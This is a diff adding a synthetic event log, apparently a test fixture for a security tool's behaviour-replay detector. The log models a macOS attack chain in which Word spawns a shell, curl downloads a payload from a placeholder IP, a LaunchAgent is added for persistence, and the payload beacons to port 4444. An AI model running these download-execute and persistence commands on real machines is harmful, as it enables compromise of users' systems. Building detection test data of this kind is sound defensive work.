@@ -1,0 +1,17 @@
+# Sec behaviour scenario: malicious document -> dropper -> persistence -> C2 (normalized format)
+# Replay: sec-cli behavior-replay data/scenarios/c2_chain.jsonl
+{"type":"exec","time_ms":1000000,"pid":500,"ppid":1,"path":"/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word","args":["Microsoft Word"],"signing":"team:UBF8T346G9"}
+{"type":"exec","time_ms":1002000,"pid":510,"ppid":500,"path":"/bin/bash","args":["bash","-c","id"],"signing":"platform"}
+{"type":"exec","time_ms":1003000,"pid":511,"ppid":510,"path":"/usr/bin/curl","args":["curl","-s","-o","/tmp/.x","http://203.0.113.9/x"],"signing":"platform"}
+{"type":"file_create","time_ms":1003500,"pid":511,"path":"/usr/bin/curl","file":"/tmp/.x","signing":"platform"}
+{"type":"exit","time_ms":1004000,"pid":511}
+{"type":"exec","time_ms":1005000,"pid":512,"ppid":510,"path":"/bin/chmod","args":["chmod","+x","/tmp/.x"],"signing":"platform"}
+{"type":"exec","time_ms":1006000,"pid":513,"ppid":510,"path":"/tmp/.x","args":["/tmp/.x"],"signing":"unsigned"}
+{"type":"file_create","time_ms":1007000,"pid":513,"path":"/tmp/.x","file":"/Users/victim/Library/LaunchAgents/com.update.helper.plist","signing":"unsigned"}
+{"type":"exec","time_ms":1008000,"pid":514,"ppid":513,"path":"/bin/launchctl","args":["launchctl","load","/Users/victim/Library/LaunchAgents/com.update.helper.plist"],"signing":"platform"}
+{"type":"net","time_ms":1010000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
+{"type":"net","time_ms":1070000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
+{"type":"net","time_ms":1130000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
+{"type":"net","time_ms":1190000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
+{"type":"net","time_ms":1250000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
+{"type":"net","time_ms":1310000,"pid":513,"path":"/tmp/.x","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"}
